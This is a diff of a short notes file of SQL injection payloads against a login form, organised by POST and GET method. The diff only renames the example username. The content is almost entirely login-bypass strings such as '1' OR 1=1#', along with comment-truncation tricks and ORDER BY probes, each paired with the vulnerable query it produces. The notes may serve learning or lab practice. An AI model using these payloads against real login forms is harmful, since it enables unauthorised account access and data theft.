@@ -1,6 +1,6 @@
 POST METHOD
 
-SELECT * FROM accounts WHERE username='atil' AND password='123456' AND 1=1#'
+SELECT * FROM accounts WHERE username='random_username' AND password='123456' AND 1=1#'
 
 password: 123456' AND 1=1#
 
@@ -8,17 +8,17 @@ password: 123456' ORDER BY 1#
 
 123456' AND 1=1--
 
-SELECT * FROM accounts WHERE username='atil'#AND password='1'
+SELECT * FROM accounts WHERE username='random_username'#AND password='1'
 
-username: atil'#
+username: random_username'#
 
-SELECT * FROM accounts WHERE username='atil'#'AND password='1'
+SELECT * FROM accounts WHERE username='random_username'#'AND password='1'
 
-username: atil
+username: random_username
 password: 1' OR 1=1#
 password: 1' OR 1=1--
 
-SELECT * FROM accounts WHERE username='atil'AND password='1' OR 1=1'#'
+SELECT * FROM accounts WHERE username='random_username'AND password='1' OR 1=1'#'
 
 GET METHOD
 
